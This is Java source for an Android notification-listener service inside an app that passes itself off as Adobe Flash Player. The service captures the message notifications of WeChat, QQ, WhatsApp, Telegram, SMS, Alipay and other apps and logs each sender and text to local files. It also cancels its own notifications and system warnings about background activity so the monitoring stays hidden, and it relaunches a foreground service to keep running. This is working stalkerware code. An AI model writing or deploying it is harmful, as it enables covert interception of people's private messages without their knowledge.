package com.adobe.flashplayer.core;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

import org.json.JSONObject;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.accessory.AccessHelper;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import android.util.Log;
import android.widget.RemoteViews;

import androidx.core.app.NotificationManagerCompat;


public class NoteListenerSrv extends NotificationListenerService{

    private static final String TAG = "[ljg]NoteListenerSrv ";

    public static final String[] APPMSGFILE_NAMES = {
            "chatNoteMsg.json",
            "qqmessage.txt",
            "weixinmessage.txt",
            "whatsappmessage.txt",
            "facebookmessage.txt",
            "skypemessage.txt",
            "twittermessage.txt",
            "telegrammessage.txt",
            "cocomessage.txt",
            "vibermessage.txt",
            "linemessage.txt",
            "youtubemessage.txt",
            "handsoutmessage.txt",
            "fgma.txt",
            "wujie.txt",
            "shortmessage.txt",
            "calllog.txt",
            "browserdownload.txt",
            "alipay"
    };

    private static  final String[] abordpacknames = {
            "com.allmessage",
            "com.tencent.mobileqq",
            "com.tencent.mm",
            "com.whatsapp",
            "com.facebook.",		//katana or messager
            "com.skype.raider",
            "com.twitter.android",
            "org.telegram",
            "com.instanza.cocovoice",
            "com.viber.voip",
            "jp.naver.line.android",
            "com.google.android.youtube",
            "com.google.android.talk",
            "com.dit.mobile.android.fgma",
            "ydt.wujie",
            "com.android.mms",
            "com.android.incallui",
            "com.android.providers.downloads.ui",
            "com.eg.android.AlipayGphone"
    };

    public static final String[] filter = {
            "高耗电",
            "其他应用",
            "上层显示",
            "正在运行",
            "后台运行"
    };

    private Context context = null;
    private String mPackageName = null;
    private String mAppName = null;

    //meizu call this function
    public NoteListenerSrv() {

        Log.e(TAG,"constructrue");
    }


	public boolean isNoteListenerSrvEnable(Context context){
	    Set<String> packageNames = NotificationManagerCompat.getEnabledListenerPackages(this);
	    if (packageNames.contains(context.getPackageName())) {
	        return true;
	    }
	    return false;
	}

    @Override
    public void onListenerConnected() {
        try{
            Log.e(TAG,"onListenerConnected");

            context = this;
            if (context == null){
                context = AccessHelper.getContext();
            }

            Public pub = new Public(getApplicationContext());

            mPackageName = context.getPackageName();

            mAppName = context.getString(R.string.app_name);

        }catch(Exception ex){
            ex.printStackTrace();
        }
    }


    private boolean delSelfNote(String tag,String packname,StatusBarNotification sn){

        boolean flag = false;
        if (tag == null || packname == null){
            return false;
        }

        for (int i = 0; i < filter.length; i++) {
            if (tag.contains(filter[i])) {
                flag = true;
            }
        }

        if (packname.contains(mPackageName) || tag.contains(mAppName) || tag.contains(mPackageName)) {
            flag = true;
        }

        if (flag) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                //will cause call back for onNotificationRemoved(StatusBarNotification)
                cancelNotification(sn.getKey());
            } else {
                cancelNotification(packname, sn.getTag(), sn.getId());
            }

            MyLog.writeLogFile(TAG+"remove self note tag:" + tag + " package:" + packname + "\r\n");
            Log.e(TAG, "remove self note tag:" + tag + ",package:" + packname);
            return true;
        }
        return false;
    }





    @Override
    public void onNotificationPosted(StatusBarNotification sn){
        try{
            if (sn == null) {
                return;
            }
            String packagename = sn.getPackageName();
            if ( packagename == null) {
                return;
            }

            String tag = sn.getTag();
            if (tag == null) {
                tag = "";
            }

            boolean deletetag = delSelfNote(tag,packagename, sn);
            if (deletetag) {
                return;
            }

            Notification notification = sn.getNotification();
            if (notification == null) {
                return;
            }

            //PendingIntent pendingIntent = null;
            String title = null;
            String text = null;
            String info = null;
            String subtext = null;
            String summery = null;
            String people = null;
            // 当 API > 18 时，使用 extras 获取通知的详细信息
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.KITKAT) {
                Bundle extras = notification.extras;
                if (extras != null) {
                    title = extras.getString(Notification.EXTRA_TITLE, "");
                    text = extras.getString(Notification.EXTRA_TEXT, "");
                    info = extras.getString(Notification.EXTRA_INFO_TEXT);

                    summery = extras.getString(Notification.EXTRA_SUMMARY_TEXT);
                    subtext = extras.getString(Notification.EXTRA_SUB_TEXT);

                    people = extras.getString(Notification.EXTRA_PEOPLE);
                    if (!TextUtils.isEmpty(text) /*&& content.contains("[微信红包]")*/) {
                        //pendingIntent = notification.contentIntent;
                    }else{
                        return;
                    }
                }else{
                    return;
                }
            }
            else if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT){
                // 当 API = 18 时，利用反射获取内容字段
                List<String> textList = getNotificationText(notification);
                if (textList != null && textList.size() > 0) {
                    for (String strtext : textList) {
                        if (!TextUtils.isEmpty(strtext) ) {		//&& text.contains("[微信红包]")
                            //pendingIntent = notification.contentIntent;
                            text = strtext;
                            break;
                        }
                    }

                    if (text == null) {
                        return;
                    }
                }else{
                    return;
                }
            }else{
                return;
            }

            deletetag = delSelfNote(text,packagename,sn);
            if (deletetag == false) {
                deletetag = delSelfNote(title,packagename,sn);
                if (deletetag) {
                    return;
                }
            }else{
                return;
            }

            String appfn = null;
            for ( int i = 0; i < abordpacknames.length; i++) {
                if (packagename.contains(abordpacknames[i])) {
                    appfn = APPMSGFILE_NAMES[i];
                    break;
                }
            }

            if (appfn == null) {
                return;
            }
		    /*
		    // 发送 pendingIntent 以此打开微信
		    try {
		        if (pendingIntent != null) {
		            pendingIntent.send();
		        }
		    } catch (PendingIntent.CanceledException e) {
		        e.printStackTrace();
		    }*/


            JSONObject json = new JSONObject();
            json.put("people", title);
            json.put("message", text);
            long sectime= System.currentTimeMillis()/1000;
            json.put("time", sectime);
            json.put("type", 1);
            json.put("group", "");
            json.put("name", packagename);

            if (subtext != null) {
                json.put("sub", subtext);
            }
            if (summery != null) {
                json.put("summery", summery);
            }

            if (people != null) {
                json.put("people", people);
            }

            if (info != null) {
                json.put("info", info);
            }

            MyLog.writeFile(Public.LOCAL_PATH_NAME , Public.CHATTING_FILENAME, json.toString()+"\r\n",true);

            CoreHelper.launchForegroundService(this);
        }
        catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("onNotificationPosted exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return ;
        }
    }



    public List<String> getNotificationText(Notification notification) {
        if (null == notification) {
            return null;
        }

        RemoteViews views = notification.bigContentView;
        if (views == null) {
            views = notification.contentView;
        }

        if (views == null) {
            return null;
        }

        // Use reflection to examine the m_actions member of the given RemoteViews object.
        // It's not pretty, but it works.
        List<String> text = new ArrayList<>();
        try {
            Field field = views.getClass().getDeclaredField("mActions");
            field.setAccessible(true);
            @SuppressWarnings("unchecked")
            ArrayList<Parcelable> actions = (ArrayList<Parcelable>) field.get(views);
            // Find the setText() and setTime() reflection actions
            for (Parcelable p : actions) {
                Parcel parcel = Parcel.obtain();
                p.writeToParcel(parcel, 0);
                parcel.setDataPosition(0);
                // The tag tells which type of action it is (2 is ReflectionAction, from the source)
                int tag = parcel.readInt();
                if (tag != 2) {
                    continue;
                }
                // View ID
                parcel.readInt();
                String methodName = parcel.readString();
                if (null == methodName) {
                    continue;
                } else if (methodName.equals("setText")) {
                    // Parameter type (10 = Character Sequence)
                    parcel.readInt();
                    // Store the actual string
                    String t = TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(parcel).toString().trim();
                    text.add(t);
                }
                parcel.recycle();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return text;
    }


    @Override
    public void onNotificationRemoved(StatusBarNotification sn){
        try{
            CoreHelper.launchForegroundService(this);

            Log.e(TAG, "start ForegroundService");
            MyLog.writeLogFile(TAG+"start ForegroundService\r\n");

            Log.e(TAG,"onNotificationRemove");
        }
        catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("onNotificationPosted exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return ;
        }
    }
}
